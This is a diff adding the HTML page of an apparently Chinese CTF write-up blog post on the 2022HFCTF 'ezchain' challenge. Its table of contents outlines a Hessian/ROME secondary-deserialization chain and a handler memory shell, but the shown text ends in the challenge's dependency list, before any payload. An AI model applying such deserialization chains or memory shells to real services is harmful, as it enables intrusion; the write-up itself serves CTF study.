@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.118.2">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Snakinya" />
+  <meta property="og:url" content="http://localhost:1313/posts/2022hfctf-ezchain/" />
+  <link rel="canonical" href="http://localhost:1313/posts/2022hfctf-ezchain/" /><link rel="apple-touch-icon" href="favicon.ico" />
+  <link rel="icon" href="favicon.ico" />
+  <link rel="shortcut" href="favicon.ico" /><link rel="alternate" type="application/atom+xml" href="http://localhost:1313index.xml" title="Snakinya">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/localhost:1313"
+      },
+      "articleSection" : "posts",
+      "name" : "CTF | 2022HFCTF ezchain",
+      "headline" : "CTF | 2022HFCTF ezchain",
+      "description" : "关键词 hession\trome\t二次反序列化\thandler内存马\n题目浅析 首先根据dockerfile可知题目环境不出网，看一下依赖：\n也就是：\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.caucho\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;\/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0.38\u0026lt;\/version\u0026gt; \u0026lt;\/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.rometools\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rome\u0026lt;\/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7.0\u0026lt;\/version\u0026gt; \u0026lt;\/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.rometools\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rome-utils\u0026lt;\/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7.0\u0026lt;\/version\u0026gt; \u0026lt;\/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.slf4j\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;slf4j-api\u0026lt;\/artifactId\u0026gt; \u0026lt;version\u0026gt;1.7.16\u0026lt;\/version\u0026gt; \u0026lt;\/dependency\u0026gt; \u0026lt;\/dependencies\u0026gt; jdk为8u181\n接下来看到Index文件\npackage com.ctf.ezchain; import com.caucho.hessian.io.Hessian2Input; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.net.httpserver.HttpServer; import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.net.InetSocketAddress; import java.util.HashMap; import java.util.Map; import java.util.Objects; import java.util.concurrent.Executors; public class Index { public Index() { } public static void main(String[] args) throws Exception { System.",
+      "inLanguage" : "en-US",
+      "author" : "Snakinya",
+      "creator" : "Snakinya",
+      "publisher": "Snakinya",
+      "accountablePerson" : "Snakinya",
+      "copyrightHolder" : "Snakinya",
+      "copyrightYear" : "2023",
+      "datePublished": "2023-01-31 00:00:00 \u002b0000 UTC",
+      "dateModified" : "2023-01-31 00:00:00 \u002b0000 UTC",
+      "url" : "http:\/\/localhost:1313\/posts\/2022hfctf-ezchain\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>CTF | 2022HFCTF ezchain</title>
+  <meta property="og:title" content="CTF | 2022HFCTF ezchain" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="关键词 hession	rome	二次反序列化	handler内存马
+题目浅析 首先根据dockerfile可知题目环境不出网，看一下依赖：
+也就是：
+&amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.caucho&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;hessian&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;4.0.38&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.rometools&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;rome&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.7.0&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.rometools&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;rome-utils&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.7.0&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.slf4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;slf4j-api&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.7.16&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; jdk为8u181
+接下来看到Index文件
+package com.ctf.ezchain; import com.caucho.hessian.io.Hessian2Input; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.net.httpserver.HttpServer; import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.net.InetSocketAddress; import java.util.HashMap; import java.util.Map; import java.util.Objects; import java.util.concurrent.Executors; public class Index { public Index() { } public static void main(String[] args) throws Exception { System." />
+  <meta name="description" content="关键词 hession	rome	二次反序列化	handler内存马
+题目浅析 首先根据dockerfile可知题目环境不出网，看一下依赖：
+也就是：
+&amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.caucho&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;hessian&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;4.0.38&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.rometools&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;rome&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.7.0&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.rometools&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;rome-utils&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.7.0&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.slf4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;slf4j-api&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.7.16&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; jdk为8u181
+接下来看到Index文件
+package com.ctf.ezchain; import com.caucho.hessian.io.Hessian2Input; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.net.httpserver.HttpServer; import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.net.InetSocketAddress; import java.util.HashMap; import java.util.Map; import java.util.Objects; import java.util.concurrent.Executors; public class Index { public Index() { } public static void main(String[] args) throws Exception { System." />
+  <meta property="og:locale" content="cn" /><meta property="og:image" content="favicon.ico" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}.sidebar ul.sub-menu{display:none}.sidebar li:hover>ul.sub-menu{display:block}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="Snakinya">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+
+
+
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post Chinese" id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  
+  <div class="header-title">
+    <a href="/"
+      >Snakinya</a
+    >
+  </div>
+  <div class="header-subtitle" style="color:blueviolet;">苍山负雪，明烛天南</div>
+</header>
+
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="/index.xml" target="_self">RSS</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://github.com/Snakinya" target="_self">Github</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/categories" target="_self">Categories</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/about/" target="_self">About</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/posts/" target="_self">Posts</a>
+  </div>
+  
+</div>
+
+<div class="header-line"></div>
+
+        </div>
+
+        <header class="post-header">
+          <h1 class="post-title">CTF | 2022HFCTF ezchain</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2023-01-31 00:00:00 UTC">
+                31 Jan 2023
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+              <div class="post-author">
+                <a target="_blank" href="http://localhost:1313">@Snakinya</a>
+              </div>
+              
+            </div>
+          </div>
+          
+        </header>
+        <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e5%85%b3%e9%94%ae%e8%af%8d" aria-label="关键词">关键词</a></li>
+                <li>
+                    <a href="#%e9%a2%98%e7%9b%ae%e6%b5%85%e6%9e%90" aria-label="题目浅析">题目浅析</a></li>
+                <li>
+                    <a href="#a1%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="A1.二次反序列化">A1.二次反序列化</a><ul>
+                        
+                <li>
+                    <a href="#tabby%e5%af%bb%e6%89%be%e5%8f%af%e5%88%a9%e7%94%a8%e7%b1%bb" aria-label="tabby寻找可利用类">tabby寻找可利用类</a></li>
+                <li>
+                    <a href="#javasecuritysignedobject" aria-label="java.security.SignedObject">java.security.SignedObject</a></li>
+                <li>
+                    <a href="#payload%e5%b0%9d%e8%af%95" aria-label="payload尝试">payload尝试</a></li>
+                <li>
+                    <a href="#%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="内存马">内存马</a></li></ul>
+                </li>
+                <li>
+                    <a href="#a2-unixprintservice" aria-label="A.2 UnixPrintService">A.2 UnixPrintService</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+        <div class="post-content markdown-body">
+          
+          <h2 id="关键词">关键词</h2>
+<p>hession	rome	二次反序列化	handler内存马</p>
+<h2 id="题目浅析">题目浅析</h2>
+<p>首先根据dockerfile可知题目环境不出网，看一下依赖：</p>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20230129175704960.png" alt="image-20230129175704960"></p>
+<p>也就是：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#008000;font-weight:bold">&lt;dependencies&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;groupId&gt;</span>com.caucho<span style="color:#008000;font-weight:bold">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;artifactId&gt;</span>hessian<span style="color:#008000;font-weight:bold">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;version&gt;</span>4.0.38<span style="color:#008000;font-weight:bold">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;groupId&gt;</span>com.rometools<span style="color:#008000;font-weight:bold">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;artifactId&gt;</span>rome<span style="color:#008000;font-weight:bold">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;version&gt;</span>1.7.0<span style="color:#008000;font-weight:bold">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;groupId&gt;</span>com.rometools<span style="color:#008000;font-weight:bold">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;artifactId&gt;</span>rome-utils<span style="color:#008000;font-weight:bold">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;version&gt;</span>1.7.0<span style="color:#008000;font-weight:bold">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#008000;font-weight:bold">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;groupId&gt;</span>org.slf4j<span style="color:#008000;font-weight:bold">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;artifactId&gt;</span>slf4j-api<span style="color:#008000;font-weight:bold">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000;font-weight:bold">&lt;version&gt;</span>1.7.16<span style="color:#008000;font-weight:bold">&lt;/version&gt;</span>
